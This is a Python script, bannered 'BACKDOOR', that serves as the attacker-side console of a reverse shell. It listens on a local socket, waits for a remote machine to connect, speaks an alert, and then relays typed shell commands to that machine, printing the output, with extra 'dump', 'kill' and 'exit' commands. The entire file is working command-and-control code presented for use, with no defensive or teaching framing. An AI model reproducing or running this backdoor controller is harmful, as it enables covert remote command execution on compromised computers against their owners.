from socket import *
import pyttsx3,os
from time import sleep
from colorama import Style, Fore

def say_text(text):
	say_text_obj.say(text)
	say_text_obj.runAndWait()


def shell():
	while 1:
		print ("\n");
		print (f"{Fore.BLUE}"+"$(Shell ("+f"{Fore.RED}"+addr[0]+f"{Fore.BLUE}"+") > "+f"{Style.RESET_ALL}",end="")
		n = input()
		if 'kill' == n:
			conn.send(b'stop')
			sleep(1)
			print (conn.recv(1024).decode())
			conn.close()
			socket_obj.close()
			exit(0)

		elif 'exit'==n or 'quit'==n or 'q'==n:
			conn.send(b'later')
			sleep(1)
			print (conn.recv(1024).decode())
			conn.close()
			socket_obj.shutdown(SHUT_RDWR)
			socket_obj.close()
			exit(0)
		elif 'dump'==n:
			conn.send(b'dump')
			sleep(1)
			a=conn.recv(1024)
			for i in a:
				print (chr(i),end="")
		else:
			conn.send(n.encode())
			sleep(1)
			print (f"{Fore.LIGHTYELLOW_EX}")
			while 1:
				output = conn.recv(1024)
				if b'enough' in output:
					break
				for i in output:
					print (chr(i),end="")
			print (f"{Style.RESET_ALL}")

def design():
	print ('''

██████╗░░█████╗░░█████╗░██╗░░██╗██████╗░░█████╗░░█████╗░██████╗░
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██████╦╝███████║██║░░╚═╝█████═╝░██║░░██║██║░░██║██║░░██║██████╔╝
██╔══██╗██╔══██║██║░░██╗██╔═██╗░██║░░██║██║░░██║██║░░██║██╔══██╗
██████╦╝██║░░██║╚█████╔╝██║░╚██╗██████╔╝╚█████╔╝╚█████╔╝██║░░██║
╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝
					-By Jeron Deeapk
''')

if __name__ == '__main__':
	os.system('clear')
	design()
	say_text_obj = pyttsx3.init()

	socket_obj = socket(AF_INET, SOCK_STREAM)
	socket_obj.setsockopt(SOL_SOCKET, SO_REUSEADDR ,1)
	socket_obj.bind(('127.0.0.1',1234))
	print ('[+] Connection was binded ')
	socket_obj.listen(5)
	while 1:
		print ('[+] Connection was waiting for accept ')
		conn, addr = socket_obj.accept()
		a="The Connection in connected addr "+addr[0]
		print ('[+] Connected address : '+addr[0]+' Port : '+str(addr[1]))
		say_text(a)
		break
	shell()


